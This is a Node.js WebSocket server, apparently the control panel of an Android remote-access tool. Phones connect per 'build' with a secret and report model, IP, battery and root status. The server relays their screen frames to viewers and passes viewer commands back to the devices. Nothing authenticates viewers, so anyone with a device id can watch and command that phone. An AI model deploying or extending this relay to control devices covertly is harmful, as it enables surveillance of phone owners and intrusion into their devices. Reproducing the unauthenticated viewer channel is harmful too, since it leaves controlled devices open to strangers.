const { WebSocketServer } = require('ws');
const { nanoid } = require('nanoid');
const db = require('./db');

const devices = new Map();
const viewers = new Map();
let wss = null;

function attach(server) {
  if (wss) return;
  wss = new WebSocketServer({ noServer: true });

  server.on('upgrade', (req, sock, head) => {
    let url;
    try { url = new URL(req.url, 'http://x'); } catch { return sock.destroy(); }

    if (url.pathname === '/agent') {
      const buildId = url.searchParams.get('b');
      const secret = url.searchParams.get('k');
      const b = db.prepare('SELECT * FROM builds WHERE id=?').get(buildId);
      if (!b || b.secret !== secret) return sock.destroy();
      return wss.handleUpgrade(req, sock, head, (ws) =>
        wss.emit('connection', ws, req, { role: 'agent', buildId }));
    }

    if (url.pathname.startsWith('/view/')) {
      const deviceId = url.pathname.split('/')[2];
      if (!deviceId) return sock.destroy();
      return wss.handleUpgrade(req, sock, head, (ws) =>
        wss.emit('connection', ws, req, { role: 'viewer', deviceId }));
    }

    sock.destroy();
  });

  wss.on('connection', (ws, req, meta) => {
    if (meta.role === 'agent') return onAgent(ws, req, meta.buildId);
    onViewer(ws, meta.deviceId);
  });
}

function onAgent(ws, req, buildId) {
  const ip = String(req.headers['x-forwarded-for'] || req.socket.remoteAddress || '')
    .split(',')[0].trim();
  let deviceId = null;

  ws.on('message', (raw) => {
    let m;
    try { m = JSON.parse(raw); } catch { return; }

    if (m.t === 'hello') {
      const d = m.device || {};
      const existing = db.prepare('SELECT id FROM devices WHERE build_id=? AND model=? AND sdk=?')
        .get(buildId, d.model, d.sdk | 0);
      deviceId = existing ? existing.id : nanoid(12);
      const now = Date.now();
      if (existing) {
        db.prepare('UPDATE devices SET ip=?,battery=?,rooted=?,last=?,online=1 WHERE id=?')
          .run(ip, d.battery | 0, d.rooted ? 1 : 0, now, deviceId);
      } else {
        db.prepare('INSERT INTO devices (id,build_id,model,brand,android,sdk,ip,battery,rooted,first,last,online) VALUES (?,?,?,?,?,?,?,?,?,?,?,1)')
          .run(deviceId, buildId, d.model || '?', d.brand || '?', d.android || '?', d.sdk | 0, ip, d.battery | 0, d.rooted ? 1 : 0, now, now);
      }
      devices.set(deviceId, ws);
      ws.deviceId = deviceId;
      ws.send(JSON.stringify({ t: 'ack', id: deviceId }));
      broadcastMeta(deviceId);
      return;
    }

    if (!deviceId) return;

    if (m.t === 'res' || m.t === 'frame') {
      const set = viewers.get(deviceId);
      if (set) for (const v of set) if (v.readyState === 1) v.send(raw.toString());
      return;
    }

    if (m.t === 'meta') {
      db.prepare('UPDATE devices SET battery=?,rooted=?,last=? WHERE id=?')
        .run(m.battery | 0, m.rooted ? 1 : 0, Date.now(), deviceId);
      broadcastMeta(deviceId);
    }
  });

  const drop = () => {
    if (!deviceId) return;
    if (devices.get(deviceId) === ws) devices.delete(deviceId);
    db.prepare('UPDATE devices SET online=0,last=? WHERE id=?').run(Date.now(), deviceId);
    broadcastMeta(deviceId);
  };
  ws.on('close', drop);
  ws.on('error', drop);
}

function onViewer(ws, deviceId) {
  if (!viewers.has(deviceId)) viewers.set(deviceId, new Set());
  viewers.get(deviceId).add(ws);

  const dev = db.prepare('SELECT * FROM devices WHERE id=?').get(deviceId);
  ws.send(JSON.stringify({ t: 'info', device: dev || null }));

  ws.on('message', (raw) => {
    const target = devices.get(deviceId);
    if (target && target.readyState === 1) target.send(raw.toString());
  });

  ws.on('close', () => {
    const set = viewers.get(deviceId);
    if (!set) return;
    set.delete(ws);
    if (!set.size) viewers.delete(deviceId);
  });
  ws.on('error', () => {});
}

function broadcastMeta(deviceId) {
  const set = viewers.get(deviceId);
  if (!set) return;
  const dev = db.prepare('SELECT * FROM devices WHERE id=?').get(deviceId);
  const msg = JSON.stringify({ t: 'meta', device: dev || null });
  for (const v of set) if (v.readyState === 1) v.send(msg);
}

module.exports = { attach, devices };
